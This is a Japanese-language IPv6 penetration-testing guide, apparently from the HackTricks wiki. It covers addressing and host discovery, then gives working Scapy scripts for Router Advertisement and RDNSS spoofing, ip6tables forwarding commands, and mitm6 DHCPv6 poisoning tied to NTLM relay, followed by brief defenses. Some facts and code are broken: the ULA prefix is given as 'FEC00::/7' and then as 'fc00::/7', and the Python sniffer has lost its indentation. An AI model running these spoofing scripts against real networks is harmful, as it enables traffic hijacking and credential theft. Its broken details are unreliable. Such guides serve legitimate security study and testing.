# Pentesting IPv6

{{#include ../../banners/hacktricks-training.md}}

## IPv6 基本理論

### ネットワーク

IPv6 アドレスは、ネットワークの組織化とデバイスの相互作用を強化するように構造化されています。IPv6 アドレスは次のように分かれています：

1. **ネットワークプレフィックス**: 最初の 48 ビットで、ネットワークセグメントを決定します。
2. **サブネット ID**: 次の 16 ビットで、ネットワーク内の特定のサブネットを定義するために使用されます。
3. **インターフェース識別子**: 最後の 64 ビットで、サブネット内のデバイスを一意に識別します。

IPv6 は IPv4 に見られる ARP プロトコルを省略していますが、2 つの主要なメッセージを持つ **ICMPv6** を導入しています：

- **隣接要求 (NS)**: アドレス解決のためのマルチキャストメッセージ。
- **隣接広告 (NA)**: NS へのユニキャスト応答または自発的な通知。

IPv6 には特別なアドレスタイプも含まれています：

- **ループバックアドレス (`::1`)**: IPv4 の `127.0.0.1` に相当し、ホスト内の内部通信に使用されます。
- **リンクローカルアドレス (`FE80::/10`)**: ローカルネットワーク活動のためのもので、インターネットルーティングには使用されません。同じローカルネットワーク上のデバイスは、この範囲を使用して互いに発見できます。

### ネットワークコマンドにおける IPv6 の実用的な使用法

IPv6 ネットワークと対話するために、さまざまなコマンドを使用できます：

- **リンクローカルアドレスの Ping**: `ping6` を使用してローカルデバイスの存在を確認します。
- **隣接発見**: `ip neigh` を使用してリンク層で発見されたデバイスを表示します。
- **alive6**: 同じネットワーク上のデバイスを発見するための代替ツールです。

以下はコマンドの例です：
```bash
ping6 –I eth0 -c 5 ff02::1 > /dev/null 2>&1
ip neigh | grep ^fe80

# Alternatively, use alive6 for neighbor discovery
alive6 eth0
```
IPv6アドレスは、デバイスのMACアドレスからローカル通信のために導出できます。以下は、既知のMACアドレスからリンクローカルIPv6アドレスを導出するための簡略ガイドと、IPv6アドレスの種類およびネットワーク内のIPv6アドレスを発見する方法の簡単な概要です。

### **MACアドレスからリンクローカルIPv6を導出する**

MACアドレス **`12:34:56:78:9a:bc`** が与えられた場合、リンクローカルIPv6アドレスは次のように構築できます：

1. MACをIPv6形式に変換： **`1234:5678:9abc`**
2. `fe80::` を前に付け、中間に `fffe` を挿入： **`fe80::1234:56ff:fe78:9abc`**
3. 左から7番目のビットを反転させ、`1234` を `1034` に変更： **`fe80::1034:56ff:fe78:9abc`**

### **IPv6アドレスの種類**

- **ユニークローカルアドレス (ULA)**：ローカル通信用で、公共インターネットルーティングには使用されません。プレフィックス： **`FEC00::/7`**
- **マルチキャストアドレス**：1対多の通信用。マルチキャストグループ内のすべてのインターフェースに配信されます。プレフィックス： **`FF00::/8`**
- **エニキャストアドレス**：1対最近接の通信用。ルーティングプロトコルに従って最も近いインターフェースに送信されます。**`2000::/3`** グローバルユニキャスト範囲の一部です。

### **アドレスプレフィックス**

- **fe80::/10**：リンクローカルアドレス（169.254.x.xに似ています）
- **fc00::/7**：ユニークローカルユニキャスト（プライベートIPv4範囲の10.x.x.x、172.16.x.x、192.168.x.xに似ています）
- **2000::/3**：グローバルユニキャスト
- **ff02::1**：マルチキャスト全ノード
- **ff02::2**：マルチキャストルーターノード

### **ネットワーク内のIPv6アドレスを発見する方法**

#### 方法1：リンクローカルアドレスを使用

1. ネットワーク内のデバイスのMACアドレスを取得します。
2. MACアドレスからリンクローカルIPv6アドレスを導出します。

#### 方法2：マルチキャストを使用

1. マルチキャストアドレス `ff02::1` にpingを送信して、ローカルネットワーク上のIPv6アドレスを発見します。
```bash
service ufw stop # Stop the firewall
ping6 -I <IFACE> ff02::1 # Send a ping to multicast address
ip -6 neigh # Display the neighbor table
```
### IPv6 Man-in-the-Middle (MitM) Attacks

IPv6ネットワークでMitM攻撃を実行するためのいくつかの技術が存在します。例えば：

- ICMPv6隣接またはルーター広告のスプーフィング。
- ルーティングを操作するためにICMPv6リダイレクトまたは「パケットが大きすぎます」メッセージを使用する。
- モバイルIPv6を攻撃する（通常、IPSecを無効にする必要があります）。
- 悪意のあるDHCPv6サーバーを設定する。

## Identifying IPv6 Addresses in the eild

### Exploring Subdomains

IPv6アドレスに関連する可能性のあるサブドメインを見つける方法は、検索エンジンを活用することです。例えば、`ipv6.*`のようなクエリパターンを使用することが効果的です。具体的には、次の検索コマンドをGoogleで使用できます：
```bash
site:ipv6./
```
### DNSクエリの利用

IPv6アドレスを特定するために、特定のDNSレコードタイプをクエリできます：

- **AXFR**: 完全なゾーン転送を要求し、広範囲のDNSレコードを明らかにする可能性があります。
- **AAAA**: IPv6アドレスを直接探します。
- **ANY**: 利用可能なすべてのDNSレコードを返す広範なクエリです。

### Ping6によるプロービング

組織に関連するIPv6アドレスを特定した後、`ping6`ユーティリティを使用してプロービングできます。このツールは、特定されたIPv6アドレスの応答性を評価するのに役立ち、隣接するIPv6デバイスを発見するのにも役立つかもしれません。

## IPv6ローカルネットワーク攻撃技術

以下のセクションでは、**同じ/64セグメント内**で実行できる実用的なレイヤー2のIPv6攻撃について説明します。以下に示すすべてのパケットは**リンクローカル**であり、ローカルスイッチを通じてのみ移動するため、ほとんどの環境で非常にステルス性があります。

### 安定したラボのためのシステム調整

IPv6トラフィックで遊ぶ前に、自分のテストによって毒されないようにボックスを強化し、大量のパケット注入/スニッフィング中に最高のパフォーマンスを得ることをお勧めします。
```bash
# Enable promiscuous mode to capture all frames
sudo ip link set dev eth0 promisc on

# Ignore rogue Router Advertisements & Redirects coming from the segment
sudo sysctl -w net.ipv6.conf.all.accept_ra=0
sudo sysctl -w net.ipv6.conf.all.accept_redirects=0

# Increase fd / backlog limits when generating lots of traffic
sudo sysctl -w fs.file-max=100000
sudo sysctl -w net.core.somaxconn=65535
sudo sysctl -w net.ipv4.tcp_tw_reuse=1
```
### パッシブNDPおよびDHCPv6スニッフィング

すべてのIPv6ホストは**自動的に複数のマルチキャストグループ**（`ff02::1`、`ff02::2`、…）に参加し、SLAAC/NDPのためにICMPv6を使用するため、パケットを1つも送信せずに全体のセグメントをマッピングできます。次のPython/Scapyのワンライナーは、最も興味深いL2メッセージをリッスンし、誰が誰であるかの色付きのタイムスタンプ付きログを出力します：
```python
#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.dhcp6 import *
from datetime import datetime
from colorama import Fore, Style, init
import argparse

init(autoreset=True)

# Human-readable names for protocols we care about
DHCP6_TYPES = {
DHCP6_Solicit:    'Solicit',
DHCP6_Advertise:  'Advertise',
DHCP6_Request:    'Request',
DHCP6_Reply:      'Reply',
DHCP6_Renew:      'Renew',
DHCP6_Rebind:     'Rebind',
DHCP6_RelayForward:'Relay-Forward',
DHCP6_RelayReply: 'Relay-Reply'
}
ICMP6_TYPES = {
ICMPv6ND_RS:      ('Router Solicitation',  Fore.CYAN),
ICMPv6ND_RA:      ('Router Advertisement', Fore.GREEN),
ICMPv6ND_NS:      ('Neighbor Solicitation',Fore.BLUE),
ICMPv6ND_NA:      ('Neighbor Advertisement',Fore.MAGENTA),
ICMPv6ND_Redirect:('Redirect',             Fore.LIGHTRED_EX),
ICMPv6MLReport:   ('MLD Report',           Fore.LIGHTCYAN_EX),
ICMPv6MLReport2:  ('MLD Report',           Fore.LIGHTCYAN_EX),
ICMPv6MLDone:     ('MLD Done',             Fore.LIGHTCYAN_EX),
ICMPv6EchoRequest:('Echo Request',         Fore.LIGHTBLACK_EX),
ICMPv6EchoReply:  ('Echo Reply',           Fore.LIGHTBLACK_EX)
}

def handler(pkt):
eth_src = pkt[Ether].src if Ether in pkt else '?'
eth_dst = pkt[Ether].dst if Ether in pkt else '?'
ip6_src = pkt[IPv6].src if IPv6 in pkt else '?'
ip6_dst = pkt[IPv6].dst if IPv6 in pkt else '?'

# Identify protocol family first
for proto,(desc,color) in ICMP6_TYPES.items():
if proto in pkt:
break
else:
if UDP in pkt and pkt[UDP].dport == 547:  # DHCPv6 server port
for dhcp_t,name in DHCP6_TYPES.items():
if dhcp_t in pkt:
desc = 'DHCPv6 – '+name; color = Fore.YELLOW; break
else:
return  # not a DHCPv6 message we track
else:
return  # not interesting

print(color + f"[{datetime.now().strftime('%H:%M:%S')}] {desc}")
print(f"  MAC  {eth_src} -> {eth_dst}")
print(f"  IPv6 {ip6_src} -> {ip6_dst}")
print('-'*60)

if __name__ == '__main__':
argp = argparse.ArgumentParser(description='IPv6 NDP & DHCPv6 sniffer')
argp.add_argument('-i','--interface',required=True,help='Interface to sniff')
argp.add_argument('-t','--time',type=int,default=0,help='Duration (0 = infinite)')
a = argp.parse_args()
sniff(iface=a.interface,prn=handler,timeout=a.time or None,store=0)
```
結果: 数秒以内に完全な**リンクローカルトポロジー** (MAC ⇄ IPv6) を構築し、アクティブスキャンに依存するIPS/IDSシステムをトリガーすることなく行います。

### ルーター広告 (RA) スプーフィング

IPv6ホストはデフォルトゲートウェイの発見のために**ICMPv6ルーター広告**に依存しています。 正当なルーターよりも**頻繁に**偽のRAを注入すると、デバイスは静かにあなたをゲートウェイとして切り替えます。
```python
#!/usr/bin/env python3
from scapy.all import *
import argparse

p = argparse.ArgumentParser()
p.add_argument('-i','--interface',required=True)
p.add_argument('-m','--mac',required=True,help='Source MAC (will be put in SrcLL option)')
p.add_argument('--llip',required=True,help='Link-local source IP, e.g. fe80::dead:beef')
p.add_argument('-l','--lifetime',type=int,default=1800,help='Router lifetime')
p.add_argument('--interval',type=int,default=5,help='Seconds between RAs')
p.add_argument('--revert',action='store_true',help='Send lifetime=0 to undo attack')
args = p.parse_args()

lifetime = 0 if args.revert else args.lifetime
ra = (IPv6(src=args.llip,dst='ff02::1',hlim=255)/
ICMPv6ND_RA(routerlifetime=lifetime, prf=0x1)/  # High preference
ICMPv6NDOptSrcLLAddr(lladdr=args.mac))

send(ra,iface=args.interface,loop=1,inter=args.interval)
```
実際に**トラフィックを転送**するには、レースに勝った後:
```bash
sudo sysctl -w net.ipv6.conf.all.forwarding=1
sudo ip6tables -A FORWARD -i eth0 -j ACCEPT
sudo ip6tables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
### RDNSS (DNS) スプーフィング via RA

[RFC 8106](https://datatracker.ietf.org/doc/html/rfc8106) は、RA 内に **Recursive DNS Server (RDNSS)** オプションを追加することを許可します。最新の OS（Win 10 ≥1709、Win 11、macOS Big Sur、Linux systemd-resolved など）は、自動的にそれを信頼します：
```python
#!/usr/bin/env python3
from scapy.all import *
import argparse

p = argparse.ArgumentParser()
p.add_argument('-i','--interface',required=True)
p.add_argument('--llip',required=True)
p.add_argument('--dns',required=True,help='Fake DNS IPv6')
p.add_argument('--lifetime',type=int,default=600)
p.add_argument('--interval',type=int,default=5)
args = p.parse_args()

ra = (IPv6(src=args.llip,dst='ff02::1',hlim=255)/
ICMPv6ND_RA(routerlifetime=0)/
ICMPv6NDOptRDNSS(dns=[args.dns],lifetime=args.lifetime))

send(ra,iface=args.interface,loop=1,inter=args.interval)
```
クライアントは、指定されたライフタイムの間、あなたのDNSをリゾルバリストの先頭に**追加**し、値が期限切れになるか、`lifetime=0`のリバートを送信するまで完全なDNSハイジャックを許可します。

### DHCPv6 DNS スプーフィング (mitm6)

SLAACの代わりに、WindowsネットワークはDNSのために**ステートレスDHCPv6**に依存することがよくあります。[mitm6](https://github.com/rofl0r/mitm6)は、`Solicit`メッセージに自動的に応答し、**あなたのリンクローカルアドレスを300秒間DNSとして割り当てる**「Advertise → Reply」フローを提供します。これにより以下が可能になります：

* NTLMリレー攻撃 (WPAD + DNSハイジャック)
* ルーターに触れずに内部名前解決を傍受する

典型的な使用法：
```bash
sudo mitm6 -i eth0 --no-ra # only DHCPv6 poisoning
```
### 防御

* **RAガード / DHCPv6ガード / NDインスペクション** を管理スイッチで使用。
* 正当なルーターのMACのみがRAを送信できるポートACL。
* **不安定な高レートのRA** や突然の **RDNSSの変更** を監視。
* エンドポイントでのIPv6の無効化は一時的な回避策であり、現代のサービスを破壊し、盲点を隠すことが多いため、代わりにL2フィルタリングを推奨。

## 参考文献

- [Legless – IPv6 Penetration Testing](https://blog.exploit.org/caster-legless/)
- [mitm6](https://github.com/rofl0r/mitm6)
- [RFC 8106 – IPv6 ND DNS Configuration](https://datatracker.ietf.org/doc/html/rfc8106)
- [http://www.firewall.cx/networking-topics/protocols/877-ipv6-subnetting-how-to-subnet-ipv6.html](http://www.firewall.cx/networking-topics/protocols/877-ipv6-subnetting-how-to-subnet-ipv6.html)
- [https://www.sans.org/reading-room/whitepapers/detection/complete-guide-ipv6-attack-defense-33904](https://www.sans.org/reading-room/whitepapers/detection/complete-guide-ipv6-attack-defense-33904)

{{#include ../../banners/hacktricks-training.md}}
